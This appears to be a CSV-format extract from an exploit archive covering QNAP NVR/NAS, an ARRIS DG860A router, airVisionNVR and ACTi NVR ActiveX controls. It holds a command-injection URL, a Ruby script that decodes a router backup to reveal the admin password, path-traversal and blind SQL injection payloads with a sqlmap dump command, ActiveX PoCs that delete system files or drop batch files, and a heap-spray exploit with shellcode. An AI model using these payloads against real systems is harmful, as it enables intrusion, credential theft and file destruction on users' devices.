http://www.example.com/cgi-bin/pingping.cgi?ping_ip=1;whoami","QNAP VioStor NVR and QNAP NAS are prone to a remote code-execution vulnerability.
Successfully exploiting this issue may allow an attacker to execute arbitrary code with elevated privileges in the context of the user running the affected application.
The following are vulnerable:
QNAP VioStor NVR running firmware 4.0.3.
QNAP NAS"
2013-10-22,WebApps,Hardware,Justin Oberdorf,ARRIS DG860A,NVRAM Backup Password Disclosure,"#!/usr/bin/env ruby
# ARRIS DG860A NVRAM Backup 'Compressor/Decompressor', it really does xor?
# Gleaned from sc_mix executable in firmware dump.
# Backup file is world readable without authentication and contains password
# information in plain text.
# box:arris-dev cosmo$ wget http://192.168.0.1/router.data
# --2013-10-17 18:21:28--  http://192.168.0.1/router.data
# Connecting to 192.168.0.1:80... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 3518 (3.4K) [application/octet-stream]
# Saving to: ‘router.data’
# 100%[=============================================================================================================>] 3,518       --.-K/s   in 0s
# 2013-10-17 18:21:28 (108 MB/s) - ‘router.data’ saved [3518/3518]
# box:arris-dev cosmo$ tar vxf router.data
# x backup/
# x backup/sc_nvram.usr.sc
# x backup/sc_nvram.sc
# box:arris-dev cosmo$ sudo ./sc_mix.rb -u -s backup/sc_nvram.usr.sc -d sc_nvram_dump
# Password:
# box:arris-dev cosmo$ cat sc_nvram_dump | tr ""\000\000"" ""\000"" | tr ""\000"" ""\n"" | grep sysAdminPassword
# sysAdminPassword[0]=test123
# box:arris-dev cosmo$
#begin","require 'optparse'
require 'highline/import'
require 'zlib'
def Compress(infile, outfile)
instream = nil
outstream = nil
size = 0
calculatedcrc = 0
data=''
size = File.size?(infile)
instream = File.open(infile,'r')
data = instream.read()
data = data.bytes.map { |a| a ^ 0xFFFFFFAA }.pack('c*')
instream.close() if !instream.nil?
outstream = File.open(outfile,'w')
outstream.write(""\x00NOF"")
outstream.write([size].pack('L>'))
calculatedcrc = Zlib::crc32(data)
outstream.write([calculatedcrc].pack('L>'))
outstream.write([size].pack('L>'))
outstream.write(""\x00\x00\x00\x00"" * 6)
outstream.write(data)
outstream.close() if !outstream.nil?
end
def Decompress(infile, outfile)
instream = nil
outstream = nil
size = 0
embeddedcrc = 0
calculatedcrc = 0
data=''
if !(File::size?(infile) >= 0x28)
puts ""[ERROR]: Source file size is insufficient(Smaller then 0x28 bytes)""
exit
end
instream = File::open(infile,'r')
if instream.read(4) != ""\x00NOF""
instream.close() if !instream.nil?
puts ""[ERROR]: Source file contains invalid magic(\\x00NOF)""
exit
end
size = instream.read(4).unpack(""L>"")[0]
embeddedcrc = instream.read(4).unpack(""L>"")[0]
if !(File.size?(infile) >= (0x28+size))
puts ""[ERROR]: Source file size if insufficient(Smaller then 0x"" + (0x28+minsize).to_s(16) + "")""
instream.close() if !instream.nil?
end
instream.seek(0x28,IO::SEEK_SET)
data = instream.read(size)
calculatedcrc = Zlib::crc32(data)
if embeddedcrc != calculatedcrc
puts ""[ERROR]: Checksum mismatch""
instream.close() if !instream.nil?
exit
end
outstream = File::open(outfile,'w')
outstream.write(data.bytes.map { |a| a ^ 0xFFFFFFAA }.pack('c*'))
instream.close() if !instream.nil?
outstream.close() if !outstream.nil?
end
if __FILE__ == $0
options = {}
opt_parser = OptionParser.new do |opts|
opts.banner = ""Usage: sc_mix.rb -s <Src_PATH> -d <Dest_PATH>""
opts.separator ""Usage:""
opts.on('-s', '--source Src_PATH', 'Source File') { |v| options[:source_file] = v }
opts.on('-d', '--destination Dest_PATH', 'Destination File') { |v| options[:destination_file] = v }
opts.on('-u', 'Uncompress') { options[:uncompress] = true }
opts.on_tail(""-h"", ""Show this message"") do
puts opts
exit
end
end
opt_parser.parse!
if options[:source_file].nil? or options[:destination_file].nil?
puts opt_parser
exit
end
if !File::exists?(options[:source_file]) or !File::readable?(options[:source_file])
puts ""[ERROR]: File does not exist or there are insufficient privileges(sudo?)""
exit
end
if File::exists?(options[:destination_file])
if !agree(""[ERROR]: File exists attempt to overwrite[yes/no]? "")
exit
end
if !File::writable?(options[:destination_file])
puts ""[ERROR]: File is not writeable is there insufficient privileges(sudo?)""
exit
end
end
if !options[:uncompress]
puts ""[WARNING]: Compression is currently beta""
Compress(options[:source_file], options[:destination_file])
else
Decompress(options[:source_file], options[:destination_file])
end
end"
2012-10-15,WebApps,PHP,pennyGrit,airVisionNVR 1.1.13,'readfile()' Disclosure / SQL Injection,http://192.168.56.101:7079/index.php?view=file&path=../../../../../../boot.ini,"Exploit Title: airVisionNVR readfile() disclosure and sql injection
Google Dork:
Date: Oct 13, 2012
Exploit Author: pennyGrit
Vendor Homepage: http://www.ubnt.com/
Software Link: http://www.ubnt.com/downloads/airvision/airVision-v1.1.3-installer.exe
Version: 1.1.13
Tested on: WinXP SP3
CVE: Possibly related to CVE-2008-1381 and/or CVE-2008-3880
Overview: The airvision NVR program is an xampp-like suite that allows a regular PC to be used as a security NVR for the Ubiquity line of IP cameras. Several programs are installed including apache, PHP, mysql and a modified version of zoneminder. Ubiquity publishes install packages for both Windows and Ubuntu however only the Windows version was tested below.
* php readfile() local file discolsure: Unauthenticated users can review the contents of anyfile on the host machine using a browser:
* sql AND/OR time-based blind injection: The 'id' parameter in ajax/event.php is vulnerable to a time based sql injection. Complete enumeration of the mysql 'nvr' database is possible.
Payload: request=event&action=video&eids=1&videoFormat=1&rate=1&scale=1&id=1 AND 3044=BENCHMARK(5000000,MD5(0x67714e77))
using sqlmap: python sqlmap.py --dbms=mysql -u ""http://192.168.56.101:7079/index.php?request=event&action=video&eids=1&videoFormat=1&rate=1&scale=1&id=1"" -p id --level 3 --risk 3 --technique T --dump"
2007-08-27,Remote,Windows,shinnai,NVR SP2 2.0 'nvUtility.dll 1.0.14.0','DeleteXMLFile()' Insecure Method,# milw0rm.com [2007-08-27],"NVR SP2 2.0 nvUtility.Utility.1 (nvUtility.dll v. 1.0.14.0) ""DeleteXMLFile()"" Inscure Method
url: http://www.acti.com/index.asp
author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://shinnai.altervista.org
This was written for educational purpose. Use it at your own risk.
Author will be not be responsible for any damage.
Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
all software that use this ocx are vulnerable to this exploits.
This control is marked as:
RegKey Safe for Script: False
RegKey Safe for Init: False
Implements IObjectSafety: True
IDisp Safe: Safe for untrusted: caller
KillBitSet: Falso
<object classid='clsid:A0D43FB0-116B-47AB-80FB-6DCFA92A03E3' id='test'></object>
<input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">
<script language='vbscript'>
Sub tryMe
Dim MyMsg
test.DeleteXMLFile ""c:\windows\system_.ini""
MyMsg = MsgBox(""Exploit completed!"")
End Sub
</script>"
2007-08-27,Remote,Windows,shinnai,NVR SP2 2.0 'nvUtility.dll 1.0.14.0','SaveXMLFile()' Insecure Method,# milw0rm.com [2007-08-27],"NVR SP2 2.0 nvUtility.Utility.1 (nvUtility.dll v. 1.0.14.0) ""SaveXMLFile()"" Inscure Method
url: http://www.acti.com/index.asp
author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://shinnai.altervista.org
This was written for educational purpose. Use it at your own risk.
Author will be not be responsible for any damage.
Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
all software that use this ocx are vulnerable to this exploits.
This control is marked as:
RegKey Safe for Script: False
RegKey Safe for Init: False
Implements IObjectSafety: True
IDisp Safe: Safe for untrusted: caller
KillBitSet: Falso
<object classid='clsid:A0D43FB0-116B-47AB-80FB-6DCFA92A03E3' id='test'></object>
<input language=VBScript onclick=tryMe() type=button value=""Click here to start the test"">
<script language='vbscript'>
Sub tryMe
Dim mStr
Dim MyMsg
mStr = ""echo off"" & vbCrLf & _
""cls"" & vbCrLf & _
""echo Hello World!"" & vbCrLf & _
""cmd.exe /c notepad.exe"" & vbCrLf & _
""pause""
test.SaveXMLFile ""c:\shinnai.bat"", mStr
MyMsg = MsgBox(""Exploit completed!"")
End Sub
</script>"
2007-08-28,Remote,Windows,shinnai,NVR SP2 2.0 'nvUnifiedControl.dll 1.1.45.0','SetText()' Command Execution,# milw0rm.com [2007-08-28],"[PoC2] NVR SP2 2.0 nvUnifiedControl.AUnifiedControl.1 (nvUnifiedControl.dll v. 1.1.45.0)
""SetText()"" Remote BoF (Heap Spray Technique)
url: http://www.acti.com/index.asp
author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://shinnai.altervista.org
This was written for educational purpose. Use it at your own risk.
Author will be not be responsible for any damage.
Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
all software that use this ocx are vulnerable to this exploits.
This control is marked as:
RegKey Safe for Script: False
RegKey Safe for Init: False
Implements IObjectSafety: True
IDisp Safe: Safe for untrusted: caller
KillBitSet: Falso
Heap Spray Technique was developed by SkyLined
(http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php)
<object id=boom classid=""clsid:A6F36F3F-3AE0-458B-AFC4-AA82565E0BF8"" style=""WIDTH: 578px; HEIGHT: 228px""></object>
<input language=JavaScript onclick=tryMe() type=button value=""Launch Exploit"">
<script>
var shellcode = unescape( ""%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800"" +
""%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A"" +
""%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350"" +
""%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40"" +
""%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000"" +
""%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040"" +
""%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD"" +
""%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40"" +
""%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18"" +
""%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0"" +
""%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B"" +
""%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24"" +
""%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9"" +
""%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C"" +
""%u652E%u6578%u9000"");
var spraySlide = unescape(""%u9090%u9090"");
var heapSprayToAddress = 0x0c0c0c0c;
function tryMe()
var size_buff = 9000;
var x =  unescape(""%0c%0c%0c%0c"");
while (x.length<size_buff) x += x;
x = x.substring(0,size_buff);
boom.SetText(1, x, 1, 1, 1, 1, 1, ""something"", 1, 1, 1, 1);
function getSpraySlide(spraySlide, spraySlideSize)
while (spraySlide.length*2<spraySlideSize)
spraySlide += spraySlide;
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return (spraySlide);
var heapBlockSize = 0x800000;
var SizeOfHeapDataMoreover = 0x5;
var payLoadSize = (shellcode.length * 2);
var spraySlideSize = heapBlockSize - (payLoadSize + SizeOfHeapDataMoreover);
var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;
var memory = new Array();
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
for (i=0;i<heapBlocks;i++)
memory[i] = spraySlide +  shellcode;
</script>"
